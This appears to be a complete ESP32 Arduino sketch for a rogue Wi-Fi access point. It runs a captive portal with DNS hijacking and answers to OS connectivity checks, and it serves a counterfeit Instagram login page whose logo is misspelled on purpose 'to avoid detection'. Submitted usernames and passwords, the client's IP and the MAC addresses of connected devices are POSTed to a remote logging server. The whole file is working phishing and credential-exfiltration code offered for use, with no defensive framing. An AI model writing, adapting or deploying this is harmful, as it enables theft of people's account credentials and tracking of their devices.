#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <HTTPClient.h>
#include "esp_wifi.h" 

// Replace these with your own network credentials
const char* apSSID = "YOUR_AP_SSID";        // Your Access Point SSID
const char* staSSID = "YOUR_STA_SSID";      // Your Wi-Fi network SSID
const char* staPassword = "YOUR_STA_PASS";  // Your Wi-Fi password

IPAddress local_IP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

WebServer server(80);
DNSServer dns;

// Replace this with your own server URL
String hostingURL = "https://yourserver.com/log_endpoint.php";

// Replace these with your HTTP Basic Auth credentials
const char* serverUser = "YOUR_USERNAME";
const char* serverPass = "YOUR_PASSWORD";

// Handlers for captive portal special URL requests:

void handle204() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(204, "text/plain", "");
}

void handleHotspotDetect() {
  const char* html = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/html", html);
}

void handleNcsiTxt() {
  const char* txt = "Microsoft NCSI";
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/plain", txt);
}

void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram</title>
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      width: 100%;
      max-width: 360px;
      margin: 40px auto;
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      text-align: center;
    }
    .logo {
      font-family: 'Arial', sans-serif;
      font-size: 36px;
      font-weight: bold;
      color: #262626;
      margin-bottom: 30px;
      letter-spacing: -1px;
    }
    input {
      width: 100%;
      padding: 9px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    button {
      width: 100%;
      padding: 9px;
      margin-top: 12px;
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .signup {
      margin-top: 20px;
      font-size: 14px;
    }
    .signup a {
      color: #00376b;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagrarn</div> <!-- intentionally "m" replaced with "rn" to avoid detection -->
    <form action="/send" method="post">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
)rawliteral";

  server.send(200, "text/html", html);
}

void handleFormGonder() {
  String username = server.arg("username");
  String password = server.arg("password");

  Serial.println("Form data received:");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);

  // Get MAC addresses of connected devices
  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);

  String macListStr = "";
  String ipListStr = "";

  for (int i = 0; i < stationList.num; i++) {
    wifi_sta_info_t station = stationList.sta[i];
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            station.mac[0], station.mac[1], station.mac[2],
            station.mac[3], station.mac[4], station.mac[5]);
    if (i > 0) {
      macListStr += ",";
      ipListStr += ",";
    }
    macListStr += macStr;
    ipListStr += "unknown"; // Cannot get connected device IP via ESP32 API
  }

  // IP address of the device filling the form
  IPAddress clientIP = server.client().remoteIP();
  String clientIPStr = clientIP.toString();

  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin(hostingURL);
    http.setAuthorization(serverUser, serverPass);
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");

    // Sending form data + client IP + connected devices MAC/IP lists
    String data = "username=" + username + "&password=" + password + "&ip=" + clientIPStr + "&mac=" + macListStr + "&ipList=" + ipListStr;

    int code = http.POST(data);
    String response = http.getString();
    Serial.printf("Server response: %d - %s\n", code, response.c_str());

    http.end();
  } else {
    Serial.println("No internet connection!");
  }

  server.send(200, "text/html", "<h3>Thank you! Your data has been received.</h3><a href='/'>Go back</a>");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);

  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(apSSID);

  WiFi.begin(staSSID, staPassword);

  Serial.print("Connecting to real Wi-Fi");
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 20) {
    delay(500);
    Serial.print(".");
    tries++;
  }
  Serial.println();

  if (WiFi.status() == WL_CONNECTED) {
    Serial.print("Real Wi-Fi connected, IP: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("Real Wi-Fi connection failed.");
  }

  if (!dns.start(53, "*", local_IP)) {
    Serial.println("DNS server could not start!");
  }

  server.on("/", handleRoot);
  server.on("/send", HTTP_POST, handleFormGonder);

  // For captive portal device checks:
  server.on("/generate_204", HTTP_GET, handle204);
  server.on("/hotspot-detect.html", HTTP_GET, handleHotspotDetect);
  server.on("/ncsi.txt", HTTP_GET, handleNcsiTxt);

  server.onNotFound([]() {
    server.sendHeader("Location", String("http://") + local_IP.toString(), true);
    server.send(302, "text/plain", "");
  });

  server.begin();
  Serial.println("Fake Wi-Fi and web server ready.");
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
}
